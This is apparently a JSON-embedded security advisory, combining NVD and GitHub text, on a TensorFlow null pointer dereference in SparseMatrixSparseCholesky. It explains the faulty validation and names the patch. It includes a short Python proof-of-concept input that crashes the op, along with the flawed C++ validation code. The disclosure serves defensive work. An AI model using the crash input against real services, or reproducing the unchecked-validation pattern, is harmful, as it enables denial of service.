    "description": "From NVD:\nTensorFlow is an end-to-end open source platform for machine learning. An attacker can trigger a null pointer dereference by providing an invalid `permutation` to `tf.raw_ops.SparseMatrixSparseCholesky`. This is because the implementation(https://github.com/tensorflow/tensorflow/blob/080f1d9e257589f78b3ffb75debf584168aa6062/tensorflow/core/kernels/sparse/sparse_cholesky_op.cc#L85-L86) fails to properly validate the input arguments. Although `ValidateInputs` is called and there are checks in the body of this function, the code proceeds to the next line in `ValidateInputs` since `OP_REQUIRES`(https://github.com/tensorflow/tensorflow/blob/080f1d9e257589f78b3ffb75debf584168aa6062/tensorflow/core/framework/op_requires.h#L41-L48) is a macro that only exits the current function. Thus, the first validation condition that fails in `ValidateInputs` will cause an early return from that function. However, the caller will continue execution from the next line. The fix is to either explicitly check `context->status()` or to convert `ValidateInputs` to return a `Status`. The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\nFrom Github:\n### Impact\nAn attacker can trigger a null pointer dereference by providing an invalid `permutation` to `tf.raw_ops.SparseMatrixSparseCholesky`:\n\n```python\nimport tensorflow as tf\nimport numpy as np\nfrom tensorflow.python.ops.linalg.sparse import sparse_csr_matrix_ops\n\nindices_array = np.array([[0, 0]])\nvalue_array = np.array([-10.0], dtype=np.float32)\ndense_shape = [1, 1]\nst = tf.SparseTensor(indices_array, value_array, dense_shape)\n\ninput = sparse_csr_matrix_ops.sparse_tensor_to_csr_sparse_matrix(\n       st.indices, st.values, st.dense_shape)\n\npermutation = tf.constant([], shape=[1, 0], dtype=tf.int32)\n \ntf.raw_ops.SparseMatrixSparseCholesky(input=input, permutation=permutation, type=tf.float32)\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/080f1d9e257589f78b3ffb75debf584168aa6062/tensorflow/core/kernels/sparse/sparse_cholesky_op.cc#L85-L86) fails to properly validate the input arguments: \n                          \n```cc \nvoid Compute(OpKernelContext* ctx) final {\n  ...\n  const Tensor& input_permutation_indices = ctx->input(1);\n  ...\n  ValidateInputs(ctx, *input_matrix, input_permutation_indices, &batch_size, &num_rows);\n  ...\n}\n\nvoid ValidateInputs(OpKernelContext* ctx,\n    const CSRSparseMatrix& sparse_matrix,\n    const Tensor& permutation_indices, int* batch_size,\n    int64* num_rows) {\n  OP_REQUIRES(ctx, sparse_matrix.dtype() == DataTypeToEnum<T>::value, ...)\n  ...\n}\n```\nAlthough `ValidateInputs` is called and there are checks in the body of this function, the code proceeds to the next line in `ValidateInputs` since [`OP_REQUIRES`](https://github.com/tensorflow/tensorflow/blob/080f1d9e257589f78b3ffb75debf584168aa6062/tensorflow/core/framework/op_requires.h#L41-L48) is a macro that only exits the current function.\n\n```cc\n#define OP_REQUIRES(CTX, EXP, STATUS)                     \\\n  do {                                                    \\\n    if (!TF_PREDICT_TRUE(EXP)) {                          \\\n      CheckNotInComputeAsync((CTX), \"OP_REQUIRES_ASYNC\"); \\\n      (CTX)->CtxFailure(__FILE__, __LINE__, (STATUS));    \\\n      return;                                             \\\n    }                                                     \\\n  } while (0)\n```\n\nThus, the first validation condition that fails in `ValidateInputs` will cause an early return from that function. However, the caller will continue execution from the next line. The fix is to either explicitly check `context->status()` or to convert `ValidateInputs` to return a `Status`.\n\n### Patches\nWe have patched the issue in GitHub commit [e6a7c7cc18c3aaad1ae0872cb0a959f5c923d2bd](https://github.com/tensorflow/tensorflow/commit/e6a7c7cc18c3aaad1ae0872cb0a959f5c923d2bd).\n\nThe fix will be included in TensorFlow 2.5.0.
